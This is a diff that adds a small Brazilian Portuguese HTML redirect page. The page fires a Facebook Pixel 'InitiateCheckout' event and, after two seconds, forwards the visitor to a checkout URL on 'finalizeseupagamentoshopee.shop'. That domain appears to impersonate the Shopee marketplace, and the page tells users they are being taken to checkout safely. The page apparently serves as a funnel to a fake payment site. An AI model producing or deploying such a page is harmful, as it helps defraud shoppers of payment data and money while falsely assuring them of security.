@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <title>Redirecionando para o checkout...</title>
+
+  <!-- Facebook Pixel -->
+  <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    
+    fbq('init', '1844323059478199'); // Seu Pixel
+    fbq('track', 'InitiateCheckout');
+  </script>
+  <noscript>
+    <img height="1" width="1" style="display:none"
+         src="https://www.facebook.com/tr?id=1844323059478199&ev=InitiateCheckout&noscript=1"/>
+  </noscript>
+
+  <!-- Redirecionamento após 2 segundos -->
+  <script>
+    setTimeout(function(){
+      window.location.href = "https://seguro.finalizeseupagamentoshopee.shop/checkout?utm_source=organicjLj6862a83caf4fe0d6d4958350&utm_campaign=&utm_medium=&utm_content=&utm_term=";
+    }, 2000);
+  </script>
+</head>
+<body>
+  <p>Estamos te levando ao checkout com segurança...</p>
+  <p>Se não for redirecionado, <a href="https://seguro.finalizeseupagamentoshopee.shop/checkout?utm_source=organicjLj6862a83caf4fe0d6d4958350&utm_campaign=&utm_medium=&utm_content=&utm_term=">clique aqui</a>.</p>
+</body>
+</html>
